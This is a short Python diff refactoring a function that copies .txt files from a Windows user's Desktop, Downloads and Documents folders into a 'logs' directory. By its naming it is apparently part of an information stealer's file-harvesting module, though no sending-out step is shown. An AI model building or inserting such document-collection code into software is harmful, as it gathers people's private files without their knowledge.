@@ -17,21 +17,16 @@ def copy_txt_files(source_folder, destination_folder):
 
 def TxtFiles():
     Log("===========TxtFiles===========")
-    user = environ['USERPROFILE']
-    destination_folder = f'{user}\\{config.pathToLogs}\\Files'
-    downloads = fr"{user}/Downloads"
-    desktop = fr"{user}/Desktop"
-    documents = fr"{user}/Documents"
+    user = environ["USERPROFILE"]
+    dest_folder = join(user, config.pathToLogs, "Files")
+    desktop = join(dest_folder, "Desktop")
+    downloads = join(dest_folder, "Downloads")
+    documents = join(dest_folder, "Documents")
 
-    try:
-        makedirs(f'{destination_folder}\\Desktop', exist_ok=True)
-        makedirs(f'{destination_folder}\\Downloads', exist_ok=True)
-        makedirs(f'{destination_folder}\\Documents', exist_ok=True)
-    except Exception as error:
-        Log(error)
+    makedirs(desktop, exist_ok=True)
+    makedirs(downloads, exist_ok=True)
+    makedirs(documents, exist_ok=True)
 
-    copy_txt_files(downloads, destination_folder+"\\Downloads")
-    copy_txt_files(desktop, destination_folder+"\\Desktop")
-    copy_txt_files(documents, destination_folder+"\\Documents")
-
-
+    copy_txt_files(join(user, "Desktop"), desktop)
+    copy_txt_files(join(user, "Downloads"), downloads)
+    copy_txt_files(join(user, "Documents"), documents)
